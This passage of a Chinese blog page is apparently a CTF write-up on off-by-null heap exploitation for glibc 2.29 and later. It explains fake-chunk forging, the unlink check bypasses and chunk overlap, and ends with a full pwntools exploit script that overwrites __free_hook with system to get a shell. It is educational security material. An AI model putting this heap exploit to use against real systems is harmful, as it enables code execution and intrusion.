Fault&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_5080[<span class="number">6</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Segmentation Fault&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Log:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_5080[<span class="number">6</span> * v1], qword_5088[<span class="number">6</span> * v1]) == qword_5088[<span class="number">6</span> * v1] )</span><br><span class="line">    *(_BYTE *)(qword_5080[<span class="number">6</span> * v1] + qword_5088[<span class="number">6</span> * v1]) = <span class="number">0</span>;				<span class="comment">//off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面来看具体的构造过程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#large</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>创建一个 large bin 大小的 chunk，free 掉之后，再 add 一个比它大的 chunk3，chunk1 会被放入 large bin。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652150079940592/ffc3972106c60951a3bc6ce35ed926af813438ae.png" alt="image-20220510103439287"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>此时我们再 add 一个 chunk，chunk1 被放入 unsorted bin 并且被切割。large bin 残留的 fd_nextsize 和 bk_nextsize 残留在 chunk4 中。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652153845903978/7c9b68ace771a4e45a38c9875afb7087f5a9d35f.png" alt="image-20220510113725656"></p>
+<p>此时就可以泄露出 libcbase 和 heapbase</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(heap+<span class="number">0x2e0</span>)+p64(<span class="number">0x101</span>)+p64(heap+<span class="number">0x300</span>))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x2e0</span>))</span><br></pre></td></tr></table></figure>
+<p>伪造一个 0x101 大小的 fake chunk，使得 <code>(fake chunk -&gt; fd) -&gt; bk == fake chunk</code>，<code>(fake chunk -&gt; bk) -&gt; fd == fake chunk</code></p>
+<p>从而绕过 unlink 的一个检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652155456640688/2799b6159e7684180ea5ea3dc5c161cdd9e4271f.png" alt="image-20220510120416427"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+<p>此时我们先将 unsorted bin 全部都申请完，再利用 chunk7 进行 off-by-null，将 chunk8 的 prev_size 改为 0x100(对应 fake chunk 的 size)，size 后两位覆盖成 ‘\x00’</p>
+<p>这样就可以绕过另外两个检查：</p>
+<p>unlink 的检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>结合 next_chunk 的宏定义一起看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>
+<p>向上合并的检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);<span class="comment">//chunk8</span></span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//fake chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652156856039246/9b40ea06fe4c3ed7065a6d0c74fbddd6551196da.png" alt="image-20220510122735802"></p>
+<p>再 dele(8)，就成功 chunk overlap 了，可以看到 chunk4 ~ chunk8 被合并成了一个 0x601 的 chunk</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652158174869327/bde938f08181fbcf64ff18b68eb589a579b3c481.png" alt="image-20220510124934625"></p>
+<hr>
+<p>这里还有一个小细节要注意的是，chunk8 的 size 被覆盖成了 0x500，但是 chunk8 下面的那个 chunk 的 prev_size 位记录了原 chunk8 的大小，如果 off-by-null 之前，这个 unsorted bin 的大小后两位不是 ‘\x00’，就会因为下一个 chunk 的 prev_size 和 0x500 不相等而报错。所以要在之前就将 chunk8 的后两位变为 ‘\x00’，说白了就是 off-by-null 覆盖 size 这一步不能改变 unsorted bin 的大小。</p>
+<hr>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">s</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;\n&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">ind,test</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,test)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">ind</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	send(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	send(<span class="number">1</span>)</span><br><span class="line">	send(<span class="number">3</span>)</span><br><span class="line">	send(<span class="number">4</span>)</span><br><span class="line">	send(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shid</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	send(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	send(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">4</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">4</span>)</span><br><span class="line">send(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#large</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7f865d134050</span>+<span class="number">0x7f865cf47000</span></span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2d0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(heap+<span class="number">0x2e0</span>)+p64(<span class="number">0xb1</span>+<span class="number">0x50</span>)+p64(heap+<span class="number">0x300</span>))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x2e0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0xb0</span>+<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">############################</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_1">https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208407#h3-5">https://www.anquanke.com/post/id/208407#h3-5</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/about/">about</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/categories/">category</a></li>
+         
+          <li><a href="/link/">link</a></li>
+         
+          <li><a href="/search/">search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%AE%8F%E5%AE%9A%E4%B9%89"><span class="toc-number">2.</span> <span class="toc-text">一些宏定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%91%E4%B8%8B%E5%90%88%E5%B9%B6"><span class="toc-number">3.</span> <span class="toc-text">向下合并</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%91%E4%B8%8A%E5%90%88%E5%B9%B6"><span class="toc-number">4.</span> <span class="toc-text">向上合并</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-27"><span class="toc-number">5.</span> <span class="toc-text">2.27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29"><span class="toc-number">6.</span> <span class="toc-text">2.29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">7.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&text=glibc2.29以上的off-by-null"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&is_video=false&description=glibc2.29以上的off-by-null"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=glibc2.29以上的off-by-null&body=Check out this article: http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&name=glibc2.29以上的off-by-null&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&t=glibc2.29以上的off-by-null"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    Xu4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
